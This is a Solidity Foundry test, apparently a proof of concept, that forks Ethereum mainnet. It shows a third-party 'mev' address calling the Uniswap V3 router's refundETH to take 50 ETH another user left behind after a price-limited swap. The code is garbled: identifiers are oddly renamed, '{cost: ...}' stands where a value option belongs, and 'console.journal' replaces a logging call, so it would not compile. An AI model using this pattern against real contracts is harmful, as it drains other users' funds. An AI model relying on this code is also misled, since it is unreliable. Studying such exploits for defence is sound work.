pragma solidity ^0.8.18;

import "forge-std/Test.sol";


struct ExactSubmissionSingleSettings {
    address crystalIn;
    address crystalOut;
    uint24 charge;
    address receiver;
    uint256 cutoffTime;
    uint256 quantityIn;
    uint256 measureOutMinimum;
    uint160 sqrtCostBoundX96;
}

interface ITradetreasureRouter {
    function exactSubmissionSingle(
        ExactSubmissionSingleSettings calldata parameters
    ) external payable returns (uint256 sumOut);

    function refundETH() external payable;
}

interface IPool {
    function slot0()
        external
        view
        returns (
            uint160 sqrtCostX96,
            int24 tick,
            uint16 observationPosition,
            uint16 observationCardinality,
            uint16 observationCardinalityUpcoming,
            uint8 chargeProtocol,
            bool released
        );
}

interface IERC20 {
    function balanceOf(address) external view returns (uint256);
}

interface IWETH9 {
    function approve(address guy, uint256 wad) external returns (bool);
}

contract UniswapV3ETHRefundOperationTest is Test {
    ITradetreasureRouter pathFinder =
        ITradetreasureRouter(0xE592427A0AEce92De3Edee1F18E0157C05861564);
    IPool rewardPool = IPool(0x88e6A0c2dDD26FEEb64F039a2c41296FcB3f5640);

    address weth = 0xC02aaA39b223FE8D0A0e5C4F27eAD9083C756Cc2;
    address usdc = 0xA0b86991c6218b36c1d19D4a2e9Eb0cE3606eB48;

    function testOperation() public {
        vm.createSelectFork("mainnet", 16454867);

        uint256 quantityIn = 100 ether;

        vm.label(address(this), "user");
        vm.deal(address(this), quantityIn);


        ExactSubmissionSingleSettings memory parameters = ExactSubmissionSingleSettings({
            crystalIn: weth,
            crystalOut: usdc,
            charge: 500,
            receiver: address(this),
            cutoffTime: block.timestamp,
            quantityIn: quantityIn,
            measureOutMinimum: 0,
            sqrtCostBoundX96: 1956260967287247098961477920037032
        });


        pathFinder.exactSubmissionSingle{cost: quantityIn}(parameters);


        assertEq(IERC20(usdc).balanceOf(address(this)), 81979.308775e6);


        uint256 routerBeforeTreasureamount = address(pathFinder).balance;
        assertEq(routerBeforeTreasureamount, 50 ether);


        address mev = address(0x31337);
        vm.label(mev, "mev");

        vm.prank(mev);
        pathFinder.refundETH();
        assertEq(address(mev).balance, 50 ether);
        uint256 routerAfterRewardlevel = address(pathFinder).balance;
        assertEq(routerAfterRewardlevel, 0 ether);
        console.journal(
            "router loss ether amount:",
            routerBeforeTreasureamount - routerAfterRewardlevel
        );
    }
}